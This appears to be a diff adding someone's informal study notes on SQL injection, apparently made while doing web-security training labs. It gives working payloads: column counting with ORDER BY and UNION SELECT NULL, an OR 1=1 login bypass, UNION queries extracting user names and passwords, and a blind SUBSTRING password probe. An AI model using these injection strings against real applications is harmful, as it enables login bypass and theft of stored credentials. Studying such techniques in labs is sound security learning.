@@ -1,0 +1,57 @@
+detect:
+simple '
+adding logic after ' and --
+time based
+OAST
+
+
+union based attacks:
+the number and type of columns you add must be the same as the original query
+
+determining the numner of columns:
+1. use ' ORDER BY 1-- and increment numbers untill you see out of index error
+index begins from 1
+2. use ' UNION SELECT NULL--
+if !match error
+else null inside tows or 
+NullPointerException
+
+' ORDER BY 1--
+returns error when you use a number over the rows
+' UNION SELECT NULL,NULL,NULL--
+returns additional row with NULL when NULLs match
+
+tricks:
+administrator' OR 1=1--
+
+' ORDER BY 1--
+' UNION SELECT NULL,NULL,NULL--
+
+attack would look like this:
+' UNION SELECT USER,PASS FROM users--
+
+' UNION SELECT NULL,USER || PASS FROM users--
+
+/filter?category=P'UNION SELECT NULL,password_mwoxri FROM users_iktcia--
+
+/filter?category=P'UNION SELECT NULL,TABLE_NAME FROM information_schema.columns WHERE COLUMN_NAME = 'rolbypassrls'--
+
+if only one column is a string you can concat columns like this:
+
+
+blind:
+TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
+
+
+
+
+tips:
+in oracle you gotta have the from in select
+in mysql you have to put %20 for a space after the comments!
+after select there is always a column name
+after from is always a table name
+where column name = something
+
+
+a hard lesson i learned after 2 hours is that spaces and little syntax quirks influence the shit out of the result
+untill you dont have  a letter = thing you can not be sure
